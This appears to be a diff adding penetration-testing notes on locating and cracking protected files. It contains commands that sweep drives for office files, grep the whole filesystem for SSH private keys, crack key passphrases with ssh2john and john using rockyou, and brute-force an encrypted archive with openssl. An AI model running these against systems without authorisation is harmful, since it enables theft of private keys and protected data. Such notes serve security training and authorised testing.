@@ -1,1 +1,38 @@
+Search Protected Files:
+Linux: 
+for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+
+Windows PS:
+$exts = "*.xls","*.xlsx","*.xltx","*.od*","*.doc","*.docx","*.pdf","*.pot","*.potx","*.pp*"
+
+foreach ($ext in $exts) {
+    Write-Host "`nFile extension: $ext" -ForegroundColor Cyan
+
+    Get-ChildItem -Path C:\ -Recurse -Include $ext -ErrorAction SilentlyContinue |
+    Where-Object {
+        $_.FullName -notmatch "\\Windows\\|\\Program Files\\|\\Program Files \(x86\)\\|\\Fonts\\|\\System32\\|\\WinSxS\\"
+    } |
+    Select-Object -ExpandProperty FullName
+}
+
+Search SSH Private Keys:
+grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
+
+ssh-keygen -yf id_ed25519
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIpNefJd834VkD5iq+22Zh59Gzmmtzo6rAffCx2UtaS6 ( Not Protected )
+
+ssh-keygen -yf ~/.ssh/id_rsa
+Enter passphrase for "/home/jsmith/.ssh/id_rsa": ( Protected )
+
+ssh-keygen -p -f id_rsa ( Passphrase added )
+
+Cracked protected files:
+ssh2john id_rsa > id.hash
+john --wordlist=rockyou.txt id.hash
+john --show id.hash
+
+Search Archive Files:
+curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt 
+
+for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done ( Brute Force )
 
